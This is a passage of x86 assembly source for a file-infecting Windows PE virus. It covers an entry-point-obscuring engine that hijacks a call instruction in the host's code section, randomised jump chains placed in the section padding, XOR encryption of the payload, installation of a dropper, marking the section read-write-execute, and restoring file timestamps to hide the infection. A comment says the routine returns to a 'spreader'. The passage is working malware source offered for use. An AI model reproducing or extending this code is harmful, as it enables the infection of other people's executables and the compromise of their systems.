; »»»PHASE 0x2: COMPLETE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;


                                                            ; * * * ;


; »»»PHASE 0x3: INVOKE EPO ENGINE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

;           »»» Determine code segment ««« 
    mov     eax, _infect_mod_file_buffer                ; eax = modified pool PTR
    mov     ebx, _infect_orig_last_seg_abs
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR edi, [ebx].PointerToRawData
    add     DWORD PTR edi, [ebx].SizeOfRawData          ; edi = Raw pointer to payload
    assume  ebx:nothing
    add     edi, _infect_payload_size
    add     edi, 6                                      ; edi = RAW Offset to entry point
    mov     DWORD PTR esi, _infect_mod_shellcode_abs    ; Absolute address of payload
    
    mov     DWORD PTR ecx, _infect_payload_size         ; Size of payload
    add     DWORD PTR ecx, _infect_dropper_size         ; Total size of payload/dropper
    add     ecx, 10                                     ; Signature Length (PHS2, LAME + adjustment)
    nop

;           »»» Call EPO ««« 
    mov     DWORD PTR ebx, _infect_orig_last_seg_abs    ; Last segment (original)
    assume  ebx:ptr IMAGE_SECTION_HEADER
    push    eax
    mov     DWORD PTR eax, [ebx].VirtualAddress         ; Load RVA
    add     DWORD PTR eax, [ebx].SizeOfRawData          ; absolute RVA of dropper
    assume  ebx:nothing
    mov     ebx, eax
    pop     eax
    ;ALLOC_MEM INFECT_TEMP_BUFFER_SIZE
    ;mov     DWORD PTR _infect_seg_buffer_temp, eax
    mov     DWORD PTR edx, _infect_mod_last_seg_abs     ; Last segment absolute
    call    _epo                                        ; Call epo engine, returns RVA of return function
    cmp     DWORD PTR eax, 1                            ; No errors returned?
    jne     _infect_fail_epo
    ;FREE_MEM _infect_seg_buffer_temp                    ; Free the pool
    
;           »»» Stamp RVA into DOS header ««« 
    mov     eax, ebx
    mov     DWORD PTR ebx, _infect_mod_file_buffer
    assume  ebx:ptr IMAGE_DOS_HEADER
    mov     DWORD PTR [ebx].e_oemid, eax                ; Commit to header
    assume  ebx:nothing
    mov     DWORD PTR _infect_epo_return, eax           ; Commit to stack
    
; »»»PHASE 0x3: COMPLETE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;


                                                            ; * * * ;
                                                            

; »»»PHASE 0x4: FINALIZE IMAGE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

;           »»» MODIFY HEADER FOR RWX PERMISSIONS ««« 
    nop
    mov     DWORD PTR ebx, _infect_mod_last_seg_abs
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR eax, [ebx].Characteristics
    and     eax, 0fffffffh
    xor     edx, edx
    mov     BYTE PTR dl, 02h                            ; execute
    xor     BYTE PTR dl, 08h                            ; write
    xor     BYTE PTR dl, 04h                            ; read
    shl     edx, 28
    xor     eax, edx
    mov     DWORD PTR [ebx].Characteristics, eax
    assume  ebx:nothing

;           »»» Size of EOF Data? ««« 
    ;jmp    _infect_eof_bypass                          ; DEBUG
    mov     DWORD PTR ebx, _infect_orig_last_seg_abs    ; Original last segment
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR eax, [ebx].PointerToRawData
    add     DWORD PTR eax, [ebx].SizeOfRawData
    cmp     eax, _infect_orig_file_size                 ; Any eof data?
    je      _infect_eof_bypass    
    assume  ebx:nothing

;           »»» Copy EOF data ««« 
    mov     ecx, eax
    sub     ecx, _infect_orig_file_size
    neg     ecx                                         ; Size
    mov     DWORD PTR ebx, _infect_orig_last_seg_abs    ; section header
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     DWORD PTR esi, [ebx].PointerToRawData       ; Offset to segment
    add     DWORD PTR esi, [ebx].SizeOfRawData          ; Raw Size of segment + offset
    add     DWORD PTR esi, _infect_orig_file_buffer     ; Source
    mov     DWORD PTR edi, _infect_mod_shellcode_abs    ; Payload    
    mov     DWORD PTR ebx, _infect_orig_pe_hdr_abs      ; Header
    assume  ebx:ptr IMAGE_NT_HEADERS
    ;add    DWORD PTR edi, [ebx].OptionalHeader.FileAlignment
    add     DWORD PTR edi, _infect_shellcode_length
    add     DWORD PTR edi, _infect_alignment_padding    
    call    _routine_byte_copy
    
;           »»» Update header information (if required) ««« 
    assume  ebx:nothing
    mov     DWORD PTR ebx, _infect_mod_pe_hdr_abs       ; PE Header
    mov     DWORD PTR eax, [ebx + NT_HDR_SECURITY_DIR]  ; SecurityDirectory RVA
    cmp     DWORD PTR eax, 0                            ; Check if it is null
    je      _infect_eof_00                              ; Jump if null, otherwise correct
    mov     DWORD PTR edx, _infect_alignment_padding    ; Padding
    add     DWORD PTR edx, _infect_shellcode_length     ; Size of realignment
    add     eax, edx                                    ; New Value
    mov     DWORD PTR [ebx + NT_HDR_SECURITY_DIR], eax  ; Commit to header    
    _infect_eof_00:

_infect_eof_bypass:
;           »»» DEBUG - MANUAL ADJUSTMENT OF BINARY ENTRY POINT (OBSOLETE) ««« 
comment /*
    mov     ebx, _infect_orig_last_seg_abs
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     eax, [ebx].VirtualAddress
    add     eax, [ebx].SizeOfRawData
    assume  ebx:nothing
    mov     ebx, _infect_mod_pe_hdr_abs
    assume  ebx:ptr IMAGE_NT_HEADERS
    add     eax, _infect_shellcode_length
    sub     eax, _infect_dropper_size
    sub     eax, 4
    mov     DWORD PTR [ebx].OptionalHeader.AddressOfEntryPoint, eax
    assume  ebx:nothing
/*

;           »»» Adjust size of initialized data ««« 
    mov     DWORD PTR ebx, _infect_mod_pe_hdr_abs       ; PE Header
    assume  ebx:ptr IMAGE_NT_HEADERS    
    mov     DWORD PTR edx, [ebx].OptionalHeader.SizeOfInitializedData
    mov     DWORD PTR eax, _infect_alignment_padding
    add     DWORD PTR eax, _infect_shellcode_length
    add     edx, eax                                    ; edx = new value
    mov     DWORD PTR [ebx].OptionalHeader.SizeOfInitializedData, edx    ; Commit
    assume  ebx:nothing

;           »»» WRITE IMAGE «««  
    mov     eax, OPT_WRITE_IMAGE                        ; Commit changes to disk?
    .IF eax==1
;           »»» Get file time «««  
        lea     eax, _infect_filetime                   ; kpLastWriteTime
        push    eax
        push    NULL                                    ; lpLastAccessTime
        push    NULL                                    ; lpCreationTime
        push    _infect_file_handle                        ; hFile
        API_CALL f_getfiletime
    
;           »»» Write image ««« 
        mov     eax, _infect_file_handle
        mov     ebx, _infect_mod_file_buffer
        mov     ecx, _infect_mod_file_size
        call    _routine_write_image
        test    al, al
        je      _infect_fail_write
        
;           »»» Set file time ««« 
        mov     eax, OPT_SET_TIME
        .IF eax==1
            lea     eax, _infect_filetime
            push    eax                                 ; lpLastWriteTime
            push    NULL                                ; lpLastAccessTime
            push    NULL                                ; lpCreationTime
            push    _infect_file_handle
            API_CALL f_setfiletime
        .ENDIF
    .ENDIF
    ; ***

;           »»» Return SUCCESS ««« 
    FREE_MEM _infect_mod_file_buffer                    ; Free modified buffer
    mov     DWORD PTR eax, INFECT_ERROR_SUCCESS
    jmp     _infect_ret
; »»»PHASE 0x4: COMPLETE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
    
; »»»INFECT RETURN CODES»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

;           »»» General EPO Failure ««« 
_infect_fail_epo:                                       ; An error generated by the EPO/EJCE engine
    ; Release modified buffer
    push    eax                                         ; Save error code
    FREE_MEM _infect_mod_file_buffer
    pop     eax
    ;mov    DWORD PTR eax, INFECT_ERROR_EPO
    jmp     _infect_ret

;           »»» 0xffee Signature detected ««« 
_infect_fail_sig_detected:                              ; File is already infected
    FREE_MEM _infect_mod_file_buffer
    mov     DWORD PTR eax, INFECT_ERROR_SIGNATURE
    jmp     _infect_ret

;           »»» UPX/Packer detected ««« 
_infect_fail_upx_signature:                             ; UPX or another packer was detected
    FREE_MEM _infect_mod_file_buffer 
    mov     DWORD PTR eax, INFECT_ERROR_UPX
    jmp     _infect_ret

;           »»» 64-Bit PE Binary ««« 
_infect_fail_64_bit_binary:
    FREE_MEM _infect_mod_file_buffer
    mov     DWORD PTR eax, INFECT_ERROR_64              ; The binary is 64-bit
    jmp     _infect_ret

;           »»» General Read Error ««« 
_infect_fail_read:                                      ; General reading error
    mov     DWORD PTR eax, INFECT_ERROR_READ
    jmp     _infect_ret

;           »»» NULL Segment (special packer) ««« 
_infect_fail_null_first_segment:
    FREE_MEM _infect_mod_file_buffer
    mov     DWORD PTR eax, INFECT_ERROR_NULL_SEG        ; First Segment name is NULL
    jmp     _infect_ret

;           »»» General Write Error ««« 
_infect_fail_write:                                     ; General writing error
    ; Release modified buffer
    FREE_MEM _infect_mod_file_buffer
    mov     DWORD PTR eax, INFECT_ERROR_WRITE
    jmp     _infect_ret    

;           »»» General Headers error «««      
_infect_fail_headers:                                   ; Mangled headers
    FREE_MEM _infect_mod_file_buffer
    mov     DWORD PTR eax, INFECT_ERROR_HEADERS                 
    jmp     _infect_ret

;           »»» Infect return ««« 
    _infect_ret:
    mov     ebx, _infect_target_string
    
;           »»» Free Original File buffer ««« 
    push    eax                                         ; Save error code
    FREE_MEM _infect_orig_file_buffer   
    pop     eax

    ; WARNING WARNING WARNING WARNING WARNING WARNING WARNING WARNING ;
    ; WARNING WARNING WARNING WARNING WARNING WARNING WARNING WARNING ;
    ; Removing this breakpoint will CFYS, you have been warned.       ;
    ;                                                                 ;
    INFECT_BREAK                                                      ;
    ;                                                                 ;
    ; WARNING WARNING WARNING WARNING WARNING WARNING WARNING WARNING ;
    ; WARNING WARNING WARNING WARNING WARNING WARNING WARNING WARNING ;
    
;           »»» NOP Padding ««« 
    s_pad00      db 4 DUP(90h)    
     
;           »»» Close file handle ««« 
    CLOSE_HANDLE _infect_file_handle
    
;           »»» Normalize Stack/return ««« 
    ; NOTE: there is a stack corruption error somewhere here, this is only a workaround FIXME
    mov     eax, esp
    mov     ebx, ebp
    sub     ebx, eax
    sub     ebx, INFECT_STACK_SIZE
    cmp     DWORD PTR ebx, 0
    je      _infect_ret_cont
    add     esp, ebx
_infect_ret_cont:
    add     esp, INFECT_STACK_SIZE
    pop     ebp
    ret                                                 ; return to spreader
    
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;





; »»»SUBROUTINE: EPO (_epo)»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
;                                                                                                                               ;
; Parameters for EPO Engine                                                                                                     ;
;                                                                                                                               ;
; [Register]        [I/O]       [Function]                                                                                      ;
; eax               IN          Address of temporary buffer                                                                     ;
; ebx               IN          Last segment: Virtual Offset + Raw Size                                                         ;
; ecx               IN          Payload size                                                                                    ;
; edx               IN          Last segment absolute virtual address                                                           ;
; edi               IN          Raw offset to body entry point                                                                  ;
; esi               IN          Absolute virtual address to body byte zero (first byte)                                         ;
; eax               OUT         Error code                                                                                      ;
;                                                                                                                               ;
;                                                                                                                               ;
; [+] Headers are tested first                                                                                                  ;
; [+] The text segment is crawled for a suitable Call instruction                                                               ;
; [+] If one is found, EJCE determines the size of the alignment padding                                                        ;
; [+] EPO exits if there is insufficient padding to install the phase 1 dropper                                                 ;
; [+] Padding is NOP'd                                                                                                          ;
; [+] Jumps are installed                                                                                                       ;
; [+] Body is XOR'd again, phase 1 dropper is installed and stamped                                                             ;
; [+] Call is rerouted and an exit jump is computed                                                                             ;
;                                                                                                                               ;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

_epo:
    nop
    push    ebp
    mov     ebp, esp                                    ; Setup stack frame
    sub     esp, EPO_STACK_SIZE

;           »»» Commit Parameters ««« 
    mov     DWORD PTR _epo_segment_buffer, eax          ; Commit to stack
    mov     DWORD PTR _epo_payload_offset, edi          ; Commit to stack
    mov     DWORD PTR _epo_payload_abs, esi             ; Commit to stack
    mov     DWORD PTR _epo_payload_size, ecx            ; Commit to stack
    mov     DWORD PTR _epo_payload_rva, ebx             ; Commit to stack
    mov     DWORD PTR _epo_last_seg, edx                ; Commit to stack
    and     edx, 0fffff000h                             ; Align to page
    mov     DWORD PTR _epo_file_buffer, edx             ; Commit to stack
    
    
    xor     eax, eax                                    ; Zero eax register
    mov     DWORD PTR _ejce_enabled, eax                ; EJCE: FALSE
    
;           »»» Determine OEP from PE header ««« 
    mov     ebx, _epo_file_buffer                       ; ebx = MZ Header
    assume  ebx:ptr IMAGE_DOS_HEADER
    mov     DWORD PTR eax, [ebx].e_lfanew
    lea     eax, [ebx + eax]                            ; eax = PE Header
    assume  ebx:nothing
    mov     DWORD PTR _epo_pe_header, eax               ; Commit to stack
    mov     WORD PTR ax, [eax]                          ; Load first 2 bytes into ax register
    cmp     WORD PTR ax, 'EP'                           ; is this a valid PE Header?
    jne     _epo_error_header                           ; If invalid, return error

;           »»» Store OEP ««« 
    mov     DWORD PTR ebx, _epo_pe_header
    assume  ebx:ptr IMAGE_NT_HEADERS
    mov     DWORD PTR eax, [ebx].OptionalHeader.AddressOfEntryPoint
    assume  ebx:nothing
    mov     DWORD PTR _epo_oep, eax                     ; Commit to stack

;           »»» Convert AddressOfEntryPoint RVA to RAW Offset ««« 
    mov     edi, eax                                    ; edi = OEP RVA
    mov     DWORD PTR ebx, _epo_pe_header
    add     ebx, OFFSET_TO_FIRST_SEGMENT                ; Move to first segment
    sub     DWORD PTR ebx, SIZEOF IMAGE_SECTION_HEADER    ; Shift back 1 (INVALID)
    assume  ebx:ptr IMAGE_SECTION_HEADER
@epo_00:
    add     DWORD PTR ebx, SIZEOF IMAGE_SECTION_HEADER  ; Shift to next segment
    mov     DWORD PTR eax, [ebx].VirtualAddress
    cmp     eax, edi                                    ; Is the segment RVA less than OEP RVA?
    jg      @epo_00
    add     DWORD PTR eax, [ebx].SizeOfRawData          ; Whole segment size
    cmp     eax, edi                                    ; Is the OEP within the segment page?
    jng     @epo_00                                     ; Executable segment found
    mov     DWORD PTR _epo_code_segment_header, ebx     ; Commit to stack
    mov     eax, edi                                    ; Move OEP RVA to eax register
    sub     DWORD PTR eax, [ebx].VirtualAddress
    add     DWORD PTR eax, [ebx].PointerToRawData       ; eax = RAW Offset
    mov     DWORD PTR ecx, [ebx].SizeOfRawData
    mov     DWORD PTR _epo_code_segment_size, ecx       ; Commit to stack
    assume  ebx:nothing
    mov     DWORD PTR _epo_raw_oep, eax
    add     DWORD PTR eax, _epo_file_buffer             ; PTR to RAW OEP
    mov     DWORD PTR _epo_raw_oep_ptr, eax             ; Commit to stack    

;           »»» Search for opcode 0xe8, check if operand is suitable ««« 
    mov     esi, eax                                    ; edi -> program code
    xor     ecx, ecx
    mov     DWORD PTR edx, _epo_code_segment_size       ; Code segment size
    sub     edx, 16h
    dec     ecx
    nop
    
    nop
    mov     esi, eax                                    ; edi -> program code
    xor     ecx, ecx
    mov     DWORD PTR edx, _epo_code_segment_size       ; Code segment size
    sub     edx, 16h
    dec     ecx

@epo_01:
    inc     ecx
    cmp     ecx, edx
    jg	     _epo_error_no_call
    lodsb                                               ; Load byte into al
    cmp     BYTE PTR al, 0e8h                           ; 0xe8 opcode
    jne     @epo_01                                     ; Wrong opcode
    mov     DWORD PTR eax, [esi]                        ; Load 32-bit operand into eax register
    nop
    and     eax, 0ff000000h                             ; Test short relative offset
    shr     eax, 24
    test    al, al                                      ; Valid operand should be 0
    je      _epo_01
    cmp     BYTE PTR al, 0ffh                           ; Test if it is reverse offset
    jne     @epo_01
_epo_01:
    dec     esi                                         ; esi = PTR to instruction
    mov     DWORD PTR _epo_call_ptr, esi	               ; Commit to stack
    mov     DWORD PTR eax, [esi + 1]                    ; Load operand into eax register
    mov     DWORD PTR _epo_call_operand, eax            ; Commit to stack
    pusha

;           »»» Convert host return Offset to Absolute RVA ««« 
    mov     DWORD PTR eax, _epo_call_ptr                ; Raw pointer to instruction
    mov     DWORD PTR ebx, _epo_code_segment_header
    assume  ebx:ptr IMAGE_SECTION_HEADER
    sub     DWORD PTR eax, _epo_file_buffer             ; Raw offset only (no base)
    sub     DWORD PTR eax, [ebx].PointerToRawData       ; Raw offset from code segment
    add     DWORD PTR eax, [ebx].VirtualAddress         ; RVA Offset only (no base)
    add     DWORD PTR eax, _epo_call_operand            ; RVA of host return function
    add     DWORD PTR eax, 5                            ; Compensate for call instruction length
    mov     DWORD PTR _ejce_return_rva, eax             ; Commit to stack
    popa    
    assume  ebx:nothing

; »»»EXTENDED JUMP CHAIN ENGINE (EJCE)»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;


;           »»» Compute address of code segment alignment padding ««« 
_ejce_resume_after_segment_expand:
    mov     DWORD PTR ebx, _epo_code_segment_header     ; Code segment header (absolute)
    assume  ebx:ptr IMAGE_SECTION_HEADER
    mov     eax, [ebx].Misc.VirtualSize
    mov     edx, [ebx].SizeOfRawData
    cmp     eax, edx                                    ; Is the VirtualSize equal to Raw Size? if so, do not infect
    je      _epo_binary_anomaly
    mov     DWORD PTR eax, [ebx].Misc.VirtualSize       ; Alignment padding
    cmp     DWORD PTR eax, 0                            ; VirtualSize 0?
    je      _epo_no_align_buffer
    add     DWORD PTR eax, [ebx].PointerToRawData
    add     DWORD PTR eax, _epo_file_buffer             ; Absolute address of alignment padding
    mov     DWORD PTR _ejce_alignment_pad_abs, eax      ; Commit to stack
    sub     DWORD PTR eax, [ebx].Misc.VirtualSize
    add     DWORD PTR eax, [ebx].SizeOfRawData

;           »»» Compute size of code segment alignment padding ««« 
    mov     esi, eax
    dec     esi
    xor     ecx, ecx
    std
@@_EJCE_a0:
    inc     ecx
    lodsb
    test    al, al
    je      @@_EJCE_a0
    cld
    mov     DWORD PTR _ejce_alignment_pad_size, ecx     ; Commit to stack
    cmp     ecx, EJCE_MIN_ALIGN_BUFFER
    jng     _epo_no_align_buffer                        ; FIXME

;           »»» Compute 'n' value of jump chains ««« 
    mov     DWORD PTR ebx, EJCE_CHAIN_FRAME_SIZE
    mov     eax, ecx
    inc     eax
    xor     edx, edx
    idiv    ebx                                         ; eax = max number of jump chains
    sub     DWORD PTR eax, EJCE_CHAIN_REDUCE            ; eax = actual number of jump chains

;           »»» Test chains ««« 
    cmp     DWORD PTR eax, EJCE_MIN_CHAINS                
    jng     _epo_no_align_buffer

;           »»» MANUAL DEBUG OVERRIDE ««« 
    ;mov    eax, 4                                      ; DEBUG - MANUAL AMOUNT OF JUMP CHAINS
    cmp     DWORD PTR eax, EJCE_MAX_CHAINS              ; Cannot overflow the stack
    jg      _ejce_error_max_chains
    mov     DWORD PTR _ejce_jump_chains, eax            ; Commit to stack

;           »»» Enable EJCE ««« 
    mov     DWORD PTR _ejce_enabled, 1                  ; EJCE: TRUE
    
;           »»» NOP entire Alignment Buffer ««« 
    mov     ebx, EJCE_CHAIN_FRAME_SIZE
    mul     ebx                                         ; Total size of chain frames
    xchg    ecx, eax
    add     ecx, EJCE_CHAIN_FRAME_SIZE + 16
    xor     eax, eax
    mov     BYTE PTR al, 090h                           ; NOP Opcode
    mov     DWORD PTR edi, _ejce_alignment_pad_abs      ; edi = alignment buffer
    cld
@@EJCE_00:
    stosb                                               ; Write NOP
    loop    @@EJCE_00
     
;           »»» Create Stack Jump Table/Zero ««« 
    mov     DWORD PTR eax, _ejce_jump_chains            ; 'n' amount of chains
    inc     eax
    mov     DWORD PTR ebx, SIZEOF ejce_chain            ; Size of frame structure (stack)
    mul     ebx                                         ; total size of stack required
    push    EJCE_BASE_SIGNATURE                         ; Place holder
    sub     esp, eax                                    ; Increase stack space
    mov     ecx, eax                                    ; Size
    mov     eax, esp                                    ; PTR
    call    _routine_zero_memory                        ; Zero all tables

;           »»» Commit 'n'/PRI values to chain structs
    mov     ebx, esp                                    ; First jump chain struct
    assume  ebx:ptr ejce_chain
    mov     DWORD PTR ecx, _ejce_jump_chains            ; Total amount
    xor     edx, edx
    inc     ecx
@@EJCE_01:
    mov     DWORD PTR [ebx].n, edx                      ; Commit n value
    mov     DWORD PTR [ebx].pri, edx                    ; Commit pri value
    inc     edx
    add     ebx, SIZEOF ejce_chain                      ; move to next chain
    loop    @@EJCE_01
    assume  ebx:nothing
    ; DEBUG
    ;jmp        _ejce_compute_jump_offsets                ; DEBUG

;           »»» Randomize PRI Values ««« 
    mov     DWORD PTR eax, _ejce_jump_chains
    mov     ecx, EJCE_PRI_RANDOMIZE_COUNT
    mul     ecx                                         ; eax = times to loop
    mov     ecx, eax

;           »»» Get first struct, p1 = edi, p2 = esi ««« 
    assume  edi:ptr ejce_chain
    assume  esi:ptr ejce_chain
    @@EJCE_02:
    push    _ejce_jump_chains
    call    RANG32                                      ; Random Value within limits of max jump chains
    mov     ebx, SIZEOF ejce_chain
    mul     ebx                                         ; eax = offset to p1 chain
    mov     edi, esp
    add     edi, eax
    push    _ejce_jump_chains
    call    RANG32
    mov     ebx, SIZEOF ejce_chain
    mul     ebx                                         ; eax = offset to p2 chain
    mov     esi, esp
    add     esi, eax
    mov     DWORD PTR eax, [esi].pri
    mov     DWORD PTR ebx, [edi].pri
    xchg    eax, ebx                                    ; Exchange PRI Values
    mov     DWORD PTR [esi].pri, eax                    ; Commit to struct
    mov     DWORD PTR [edi].pri, ebx                    ; Commit to struct
    loop    @@EJCE_02   
    assume  esi:nothing
    assume  edi:nothing

; »»»COMPUTER JUMP OFFSETS»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
;                                                                                                                               ;
; [(n2 - n1) * EJCE_CHAIN_FRAME_SIZE] - 10 = Relative Jump Offset                                                               ;
;                                                                                                                               ;
; Example Jump Table:                                                                                                           ;
;                                                                                                                               ;
; |n|    |PRI|    |rel| ;                                                                                                       ;
;-----------------------;                                                                                                       ;
;   0        0        5 ; (IN)                                                                                                  ;
;   1        1       70 ;                                                                                                       ;
;   2        5       42 ;                                                                                                       ;
;   3        4      -26 ;                                                                                                       ;
;   4        6      OUT ; => PHS1 Dropper                                                                                       ;
;   5        3      -42 ;                                                                                                       ;
;   6        2      -26 ;                                                                                                       ;
;-----------------------;                                                                                                       ;
; Routine computes jump offsets using consecutive PRI values.                                                                   ;
; Go by n values. For each n, locate the next PRI value.                                                                        ;
; Load n value of next PRI. Compute n2 - n1.                                                                                    ;
;                                                                                                                               ;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
_ejce_compute_jump_offsets:
    xor     ecx, ecx                                    ; Store 'n' value
    mov     ebx, esp                                    ; ebx ALWAYS points to CURRENT n (not next PRI)
    assume  ebx:ptr ejce_chain
    sub     ebx, SIZEOF ejce_chain
@@EJCE_03:
    add     ebx, SIZEOF ejce_chain
    mov     DWORD PTR edi, [ebx].n                      ; Load n value into edi register
    mov     DWORD PTR edx, [ebx].pri                    ; Load pri value into edx register
    inc     edx                                         ; Next PRI
    cmp     DWORD PTR edx, _ejce_jump_chains            ; edx > max chains?
    jg      _ejce_generate_jump_instructions            ; Jump if so
    mov     eax, esp                                    ; Enumerate all frame values
    assume  eax:ptr ejce_chain
    sub     eax, SIZEOF ejce_chain
@@EJCE_04_LocateNextPri:
    add     eax, SIZEOF ejce_chain
    mov     DWORD PTR esi, [eax].pri                    ; Load PRI Value    
    cmp     esi, edx                                    ; Is this the next pri?
    jne     @@EJCE_04_LocateNextPri
    mov     DWORD PTR esi, [eax].n                      ; 'n' value    
    sub     esi, edi
    mov     eax, esi
    mov     edx, 16
    mul     edx
    sub     eax, 10    
    mov     DWORD PTR [ebx].jump_offset, eax            ; Commit value to struct
    inc     ecx
    cmp     ecx, _ejce_jump_chains                      ; Max jump chains reached?
    jne     @@EJCE_03
    assume  eax:nothing

;           »»» Generate Jump Instructions ««« 
    _ejce_generate_jump_instructions:
    mov     DWORD PTR ecx, _ejce_jump_chains            ; ecx = n counter
    mov     esi, esp                                    ; esi = n[0]
    assume  esi:ptr ejce_chain
    mov     DWORD PTR ebx, _ejce_alignment_pad_abs      ; ebx = PTR to pool
    add     ebx, 10                                     ; Move to jmp Mnemonic
@@EJCE_05:
    mov     BYTE PTR [ebx], 0e9h                        ; jmp rel/near mnemonic
    mov     DWORD PTR eax, [esi].jump_offset
    mov     DWORD PTR [ebx + 1], eax                    ; Commit instruction operand
    add     esi, SIZEOF ejce_chain                      ; Increment current table (chain)
    add     ebx, EJCE_CHAIN_FRAME_SIZE                  ; Increment current frame
    loop    @@EJCE_05    
    assume  esi:nothing

;           »»» Compute offset to PRI 0 (Entry Point) ««« 
    ; Find PRI 0 
    xor     ecx, ecx
    mov     ebx, esp                                    ; ebx = PTR to structs
    assume  ebx:ptr ejce_chain
    dec     ecx
@@EJCE_06: 
    inc     ecx
    mov     DWORD PTR eax, [ebx].pri                    ; Load PRI value into al register
    add     ebx, SIZEOF ejce_chain
    test    al, al
    jne     @@EJCE_06
    ;cmp     DWORD PTR _epo_call_type, 0
    ;jne     _ejce_far_call                              ; 0 is e8, 1 is ff15
    
    assume  ebx:nothing
    mov     eax, EJCE_CHAIN_FRAME_SIZE
    mul     ecx                                         ; Offset to entry
    add     eax, _ejce_alignment_pad_abs                ; Absolute address of entry(RAW)
    mov     ebx, _epo_call_ptr                          ; Absolute address of Instruction
    sub     eax, ebx                                    ; Relative offset (OPERAND)
    inc     ebx
    mov     DWORD PTR [ebx], eax                        ; Commit to operand 

comment *
       
_ejce_far_call:
    BREAK
    mov     eax, EJCE_CHAIN_FRAME_SIZE
    mul     ecx                                         ; Get offset to EJCE entry
    add     eax, _ejce_alignment_pad_abs
    sub     eax, _epo_file_buffer                       ; RAW offset
    mov     DWORD PTR ebx, _epo_code_segment_header     ; Load segment header
    assume  ebx:ptr IMAGE_SECTION_HEADER
    sub     DWORD PTR eax, [ebx].PointerToRawData       ; Segment offset
    add     DWORD PTR eax, [ebx].VirtualAddress         ; RVA
    assume  ebx:nothing
    mov     DWORD PTR ebx, _epo_pe_header               ; PE Header
    assume  ebx:ptr IMAGE_NT_HEADERS
    add     DWORD PTR eax, [ebx].OptionalHeader.ImageBase
    assume  ebx:nothing
    mov     DWORD PTR ebx, _epo_call_operand
    mov     DWORD PTR [ebx], eax                        ; Modify operand

*

;           »»» Locate Address of Last Frame ««« 
    mov     DWORD PTR ebx, _ejce_jump_chains
    mov     DWORD PTR eax, EJCE_CHAIN_FRAME_SIZE
    mul     ebx
    add     DWORD PTR eax, _ejce_alignment_pad_abs      ; Absolute address of last frame
    inc     eax
    mov     DWORD PTR _ejce_phase_1_dropper_abs, eax    ; Commit to stack
    
;           »»» Gen Key and XOR Payload/PHS2 ««« 
    nop
    call    _routine_gen_key                            ; Generate one key
    mov     DWORD PTR _ejce_phase_1_key, eax            ; Commit to stack
    mov     edx, eax                                    ; edx = XOR Key
    xor     ecx, ecx
    mov     DWORD PTR ebx, _epo_payload_abs             ; Absolute address of payload
    mov     DWORD PTR edi, _epo_payload_size
    ;add    edi, 16                                     ; Include LAME Signature
@@EJCE_07:
    mov     DWORD PTR eax, [ebx + ecx]                  ; Load 4 bytes into eax
    xor     eax, edx                                    ; XOR
    mov     DWORD PTR [ebx + ecx], eax                  ; store
    add     ecx, 4
    cmp     ecx, edi
    jng     @@EJCE_07
    
;           »»» Install Phase 1 Dropper ««« 
    call    _ejce_delta
_ejce_delta:
    nop
    mov     DWORD PTR eax, EJCE_CHAIN_FRAME_SIZE
    mov     DWORD PTR ebx, _ejce_jump_chains
    inc     ebx
    mul     ebx
    add     DWORD PTR eax, _ejce_alignment_pad_abs      ; Absolute address of dropper
    mov     DWORD PTR _ejce_phase_1_dropper_abs, eax    ; Commit to stack
    mov     edi, eax                                    ; edi = dest
    pop     esi
    add     esi, EJCE_OFFSET_TO_PHS1                    ; Dropper code
    mov     ecx, EJCE_DROPPER_SIZE                      ; Size of dropper
    call    _routine_byte_copy
    jmp     _ejce_post_dropper                          ; Skip dropper code


; »»»PHASE ONE DROPPER CODE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
;                                                                                                                               ;
    ; Note: operands are always null in [bytes] field                                                                           ;
